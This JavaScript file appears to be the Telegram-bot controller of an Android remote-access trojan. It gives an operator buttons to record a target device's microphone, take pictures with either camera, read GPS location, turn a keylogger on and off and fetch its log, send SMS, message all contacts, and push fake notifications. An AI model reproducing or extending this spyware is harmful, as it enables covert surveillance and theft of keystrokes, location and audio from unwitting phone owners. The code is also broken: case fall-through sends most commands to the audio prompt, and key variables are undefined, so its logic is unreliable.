//const appBot = require('./index').appBot;

function handleCallbackQuery(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const uuid = data.split(':')[1];
    console.log(uuid);
    if (command == 'device') {
        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}` }, { text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}` }],
                    [{ text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}` }, { text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}` }],
                    [{ text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `gpsLocation:${uuid}` }, { text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}` }],
                    [{ text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}` }, { text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}` }],
                    [{ text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}` }, { text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `send_message_to_all:${uuid}` }],
                    [{ text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}` }, { text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}` }],
                    [{ text: '𝙂𝙚𝙩𝙆𝙚𝙮𝙇𝙤𝙜', callback_data: `sendkey:${uuid}` }, { text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙊𝙣', callback_data: `listeneron:${uuid}` }, { text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙊𝙛𝙛', callback_data: `listeneroff:${uuid}` }],
                ]
            },
            parse_mode: "HTML"
        });
    }

    function sendMessageThroughSocket(uuid, message) {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid === uuid) {
                ws.send(message);
            }
        });
    }

    appBot.deleteMessage(id, msg.message_id);

    switch (command) {
            case 'device_info':
            case 'camera_main':
            case 'gpsLocation':            
            case 'vibrate':                        
            case 'sendkey':            
            case 'camera_selfie':
            case 'listeneron':
            case 'listeneroff':            
                case 'play_audio':
                    appBot.deleteMessage(id, msg.message_id)
                    appBot.sendMessage(id,
                        '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
                        '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
                        {reply_markup: {force_reply: true}, parse_mode: "HTML"}
                    )
                    currentUuid = uuid
                    break;
                case 'stop_audio':
                    sendMessageThroughSocket(uuid, command);
                    appBot.sendMessage(id,
                        '°• 𝙔𝙤𝙪𝙧 𝙖𝙪𝙙𝙞𝙤 𝙝𝙖𝙨 𝙨𝙩𝙤𝙥𝙥𝙚𝙙.\n\n' +
                        '• 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙨𝙩𝙖𝙧𝙩 𝙖𝙣𝙤𝙩𝙝𝙚𝙧 𝙖𝙪𝙙𝙞𝙤 𝙤𝙧 𝙚𝙣𝙟𝙤𝙮 𝙤𝙩𝙝𝙚𝙧 𝙖𝙘𝙩𝙞𝙤𝙣𝙨',
                        {
                            parse_mode: "HTML",
                            "reply_markup": {
                                "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]]
                            }
                        }
                    );
                    break;
                case 'send_message':
                    appBot.deleteMessage(id, msg.message_id)
                    appBot.sendMessage(id, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
                        '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
                        {reply_markup: {force_reply: true}})
                    currentUuid = uuid
                    break;
                case 'send_message_to_all':
                    appBot.deleteMessage(id, msg.message_id)
                    appBot.sendMessage(id,
                        '𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
                        '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
            currentUuid = uuid
            break;
        case 'microphone':
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
                '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
                {reply_markup: {force_reply: true}, parse_mode: "HTML"}
            )
            currentUuid = uuid
            break;
        case 'toast':
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
                '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
                {reply_markup: {force_reply: true}, parse_mode: "HTML"}
            )
            currentUuid = uuid
            break;
        case 'show_notification':
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
                '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
                {reply_markup: {force_reply: true}, parse_mode: "HTML"}
            )
            currentUuid = uuid
            break;
        default:
            appBot.sendMessage(id,
                '°• 𝙎𝙤𝙧𝙧𝙮, 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙣𝙤𝙩 𝙧𝙚𝙘𝙤𝙜𝙣𝙞𝙯𝙚𝙙',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]]
                    }
                }
            );
        break;
    }
}
module.exports = { handleCallbackQuery };
